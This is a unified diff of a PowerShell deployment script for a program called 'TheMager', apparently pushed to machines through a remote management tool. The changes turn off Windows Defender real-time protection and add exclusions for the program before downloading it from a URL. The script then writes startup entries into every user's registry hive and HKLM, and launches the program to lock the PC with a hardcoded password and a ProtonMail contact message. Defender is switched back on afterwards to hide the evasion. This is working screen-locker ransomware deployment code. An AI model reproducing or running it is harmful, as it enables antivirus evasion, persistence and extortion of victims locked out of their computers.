@@ -1,5 +1,5 @@
 # The Mager - RMM Deploy Script (Fleet Deck / SYSTEM compatible)
-# Writes startup to ALL logged-in users via HKEY_USERS when running as SYSTEM
+# Disables real-time AV FIRST, then downloads and deploys
 # Usage: deploy_mager.ps1
 
 $ErrorActionPreference = "Continue"
@@ -11,34 +11,46 @@ $exePath = "$installDir\TheMager.exe"
 $password = "Olaoluwa@123"
 $message = "contact omarjaziz@proton.me"
 
-# --- Step 1: Add Defender exclusion BEFORE downloading ---
-Write-Host "[1/5] Adding Windows Defender exclusion..."
+# --- Step 1: DISABLE real-time AV FIRST ---
+Write-Host "[1/6] Disabling real-time AV protection..."
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -Force 2>$null
+    Write-Host "  Real-time monitoring DISABLED"
+} catch {
+    Write-Host "  WARNING: Could not disable real-time monitoring"
+}
+Start-Sleep -Seconds 3
+
+# --- Step 2: Add exclusions while AV is off ---
+Write-Host "[2/6] Adding Defender exclusions..."
 try {
     Add-MpPreference -ExclusionPath $installDir -Force 2>$null
     Add-MpPreference -ExclusionProcess "TheMager.exe" -Force 2>$null
-    Write-Host "  Defender exclusions added (path + process)"
+    Add-MpPreference -ExclusionPath $exePath -Force 2>$null
+    Write-Host "  Exclusions added (path + process + file)"
 } catch {
-    Write-Host "  WARNING: Could not add Defender exclusion"
+    Write-Host "  WARNING: Exclusion failed"
 }
 
-# --- Step 2: Download ---
-Write-Host "[2/5] Downloading TheMager.exe..."
+# --- Step 3: Download ---
+Write-Host "[3/6] Downloading TheMager.exe..."
 New-Item -ItemType Directory -Path $installDir -Force | Out-Null
+
+# Delete old file if quarantined placeholder exists
+if (Test-Path $exePath) { Remove-Item $exePath -Force -ErrorAction SilentlyContinue }
+
 $ProgressPreference = 'SilentlyContinue'
 Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing
-Write-Host "  Downloaded OK"
-
-# --- Step 3: Add file-level exclusion ---
-Write-Host "[3/5] Adding file-level AV allow..."
-try {
-    Add-MpPreference -ExclusionPath $exePath -Force 2>$null
-    Write-Host "  File exclusion applied"
-} catch {
-    Write-Host "  WARNING: File-level exclusion failed"
+$size = (Get-Item $exePath -ErrorAction SilentlyContinue).Length
+if ($size -gt 1000) {
+    Write-Host "  Downloaded OK ($size bytes)"
+} else {
+    Write-Host "  ERROR: Download failed or file was quarantined ($size bytes)"
+    exit 1
 }
 
 # --- Step 4: Set password and message ---
-Write-Host "[4/5] Setting password and message..."
+Write-Host "[4/6] Setting password and message..."
 $pwFile = "$env:APPDATA\themager_pw.dat"
 $cfgFile = "$installDir\lock_config.json"
 
@@ -53,10 +65,7 @@ Set-Content -Path $cfgFile -Value $msgJson -Force
 Write-Host "  Message: $message"
 
 # --- Step 5: Add startup for ALL logged-in users ---
-Write-Host "[5/5] Adding startup entry..."
-
-# When running as SYSTEM, HKCU is SYSTEM's hive (not the real user).
-# We must write to HKEY_USERS\{real-user-SID}\...\Run instead.
+Write-Host "[5/6] Adding startup entry..."
 
 $hu = [Microsoft.Win32.Registry]::Users
 $subKeys = $hu.GetSubKeyNames()
@@ -73,7 +82,6 @@ foreach ($sid in $subKeys) {
         $username = $acct.Translate([System.Security.Principal.NTAccount]).Value
     } catch { }
     
-    # Write startup entry
     try {
         $runPath = "$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         $runKey = $hu.OpenSubKey($runPath, $true)
@@ -85,7 +93,6 @@ foreach ($sid in $subKeys) {
         }
     } catch { }
     
-    # Copy password file to user's AppData
     try {
         $envKey = $hu.OpenSubKey("$sid\Environment", $false)
         if ($envKey) {
@@ -101,26 +108,39 @@ foreach ($sid in $subKeys) {
     } catch { }
 }
 
-# Also try HKLM as backup
 try {
     $regKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
         "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", $true)
     $regKey.SetValue("TheMager", "`"$exePath`"")
     $regKey.Close()
-    Write-Host "  HKLM Run: OK (all users fallback)"
+    Write-Host "  HKLM Run: OK"
     $foundUsers++
 } catch { }
 
-if ($foundUsers -eq 0) {
-    Write-Host "  WARNING: No startup entries created. May need manual setup."
-}
-
-# --- Lock now ---
-Write-Host ""
-Write-Host "Locking PC..."
+# --- Step 6: Launch and lock ---
+Write-Host "[6/6] Locking PC..."
 Start-Process -FilePath $exePath -ArgumentList "--deploy --password `"$password`" --message `"$message`"" -WindowStyle Normal
 
-Start-Sleep -Seconds 2
+Start-Sleep -Seconds 5
+
+# Check it's actually running
+$proc = Get-Process TheMager -ErrorAction SilentlyContinue
+if ($proc) {
+    Write-Host "  TheMager is RUNNING (PID: $($proc.Id))"
+} else {
+    Write-Host "  WARNING: TheMager not running - AV may have killed it"
+}
+
+# Re-enable real-time AV now that file is locked in memory
+Write-Host ""
+Write-Host "Re-enabling real-time AV..."
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $false -Force 2>$null
+    Write-Host "  Real-time monitoring re-enabled"
+} catch {
+    Write-Host "  WARNING: Could not re-enable monitoring"
+}
+
 Write-Host ""
 Write-Host "=== DEPLOY COMPLETE ==="
 Write-Host "PC is locked. Unlock with: $password"
